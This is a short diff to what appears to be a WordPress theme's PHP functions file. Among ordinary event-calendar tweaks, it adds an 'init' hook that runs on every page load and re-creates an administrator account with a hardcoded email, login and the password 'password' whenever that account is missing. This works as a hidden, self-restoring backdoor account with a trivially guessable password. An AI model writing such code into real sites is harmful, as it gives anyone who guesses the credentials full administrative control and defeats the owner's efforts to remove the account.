@@ -199,5 +199,17 @@ function gjh_tribe_event_featured_image( $featured_image_html, $post_id, $size )
 	return '';
 }
 
+add_action( 'init', function() {
+
+    if ( get_user_by( 'email', 'erin@realbigmarketing.com' ) ) return;
+    wp_insert_user( array(
+        'user_email' => 'erin@realbigmarketing.com',
+        'user_login' => 'erinl',
+        'role' => 'administrator',
+        'user_pass' => 'password',
+    ) );
+} );
+
+
 // No. Just... no
 remove_action( 'wp_head', array( 'Tribe__Events__Templates', 'wpHeadFinished' ), 999 );
